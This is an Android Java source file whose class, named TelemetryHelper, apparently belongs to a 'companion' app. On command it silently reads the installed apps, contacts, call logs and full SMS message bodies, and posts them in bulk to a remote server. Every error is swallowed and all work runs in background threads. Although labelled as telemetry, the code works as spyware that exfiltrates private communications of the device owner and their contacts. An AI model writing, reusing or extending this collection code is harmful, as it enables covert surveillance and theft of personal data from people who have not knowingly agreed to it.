package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class TelemetryHelper {

    public static void syncInstalledApps(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    PackageManager pm = context.getPackageManager();
                    List<PackageInfo> packages = pm.getInstalledPackages(0);
                    JSONArray apps = new JSONArray();

                    for (PackageInfo pi : packages) {
                        JSONObject app = new JSONObject();
                        app.put("package_name", pi.packageName);
                        app.put("app_name", pi.applicationInfo.loadLabel(pm).toString());
                        boolean isSystem = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                        app.put("is_system_app", isSystem);
                        app.put("usage_time_seconds", 0);
                        apps.put(app);
                    }

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("installed_apps", apps);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncContacts(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    java.util.LinkedHashMap<String, JSONObject> map = new java.util.LinkedHashMap<>();

                    // 1. Phone contacts (all SIMs + Google accounts)
                    scanPhoneContacts(cr, map);

                    // 2. Email-only contacts (Gmail, etc.)
                    scanEmailContacts(cr, map);

                    // Send in batches of 2000
                    JSONArray batch = new JSONArray();
                    for (JSONObject obj : map.values()) {
                        batch.put(obj);
                        if (batch.length() >= 2000) {
                            sendContactBatch(serverUrl, deviceId, cmdId, batch);
                            batch = new JSONArray();
                        }
                    }
                    if (batch.length() > 0) {
                        sendContactBatch(serverUrl, deviceId, cmdId, batch);
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    private static void scanPhoneContacts(ContentResolver cr, java.util.LinkedHashMap<String, JSONObject> map) {
        try {
            Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);

            while (c.moveToNext() && map.size() < 20000) {
                String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
                String num = numIdx >= 0 ? c.getString(numIdx) : null;
                String id = idIdx >= 0 ? c.getString(idIdx) : null;
                if (name == null || name.trim().isEmpty()) name = "Contact #" + (map.size() + 1);
                String key = id != null ? id : name;
                JSONObject item = map.get(key);
                if (item == null) {
                    item = new JSONObject();
                    item.put("name", name);
                    item.put("phone_numbers", new JSONArray());
                    item.put("emails", new JSONArray());
                    map.put(key, item);
                }
                if (num != null && !num.trim().isEmpty()) {
                    item.getJSONArray("phone_numbers").put(num.trim());
                }
            }
            c.close();
        } catch (Exception ignored) {}
    }

    @SuppressLint("Range")
    private static void scanEmailContacts(ContentResolver cr, java.util.LinkedHashMap<String, JSONObject> map) {
        try {
            Cursor c = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME);
            int emailIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
            int idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID);

            while (c.moveToNext() && map.size() < 20000) {
                String name = nameIdx >= 0 ? c.getString(nameIdx) : null;
                String email = emailIdx >= 0 ? c.getString(emailIdx) : null;
                String id = idIdx >= 0 ? c.getString(idIdx) : null;
                if (name == null || name.trim().isEmpty()) name = email != null ? email : "Contact #" + (map.size() + 1);
                String key = id != null ? id : name;
                JSONObject item = map.get(key);
                if (item == null) {
                    item = new JSONObject();
                    item.put("name", name);
                    item.put("phone_numbers", new JSONArray());
                    item.put("emails", new JSONArray());
                    map.put(key, item);
                }
                if (email != null && !email.trim().isEmpty()) {
                    item.getJSONArray("emails").put(email.trim());
                }
            }
            c.close();
        } catch (Exception ignored) {}
    }

    private static void sendContactBatch(String serverUrl, String deviceId, String cmdId, JSONArray batch) {
        try {
            JSONObject body = new JSONObject();
            body.put("device_id", deviceId);
            if (cmdId != null) body.put("command_id", cmdId);
            body.put("contacts", batch);
            ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
        } catch (Exception ignored) {}
    }

    @SuppressLint("Range")
    public static void syncCalls(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);

                    while (c.moveToNext() && list.length() < 5000) {
                        String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                        String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
                        long duration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                        long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));

                        String callType = "incoming";
                        if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
                        else if (type == CallLog.Calls.MISSED_TYPE) callType = "missed";
                        else if (type == CallLog.Calls.REJECTED_TYPE) callType = "rejected";

                        JSONObject item = new JSONObject();
                        item.put("phone_number", number != null ? number : "Unknown");
                        if (name != null) item.put("contact_name", name);
                        item.put("call_type", callType);
                        item.put("duration_seconds", duration);
                        // Truncate to seconds precision to match DB upsert
                        item.put("timestamp", iso.format(new Date((date / 1000) * 1000)));
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("calls", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    @SuppressLint("Range")
    public static void syncMessages(final Context context, final String serverUrl, final String deviceId, final String cmdId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = context.getContentResolver();
                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
                    if (c == null) return;

                    JSONArray list = new JSONArray();
                    SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);

                    while (c.moveToNext() && list.length() < 10000) {
                        String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                        String bodyText = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                        int type = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
                        long date = c.getLong(c.getColumnIndex(Telephony.Sms.DATE));

                        JSONObject item = new JSONObject();
                        item.put("sender", address != null ? address : "Unknown");
                        item.put("body", bodyText != null ? bodyText : "");
                        item.put("message_type", type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "inbox");
                        // Truncate to seconds precision to match DB upsert
                        item.put("timestamp", iso.format(new Date((date / 1000) * 1000)));
                        list.put(item);
                    }
                    c.close();

                    JSONObject body = new JSONObject();
                    body.put("device_id", deviceId);
                    if (cmdId != null) body.put("command_id", cmdId);
                    body.put("messages", list);

                    ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                } catch (Exception ignored) {}
            }
        }).start();
    }
}
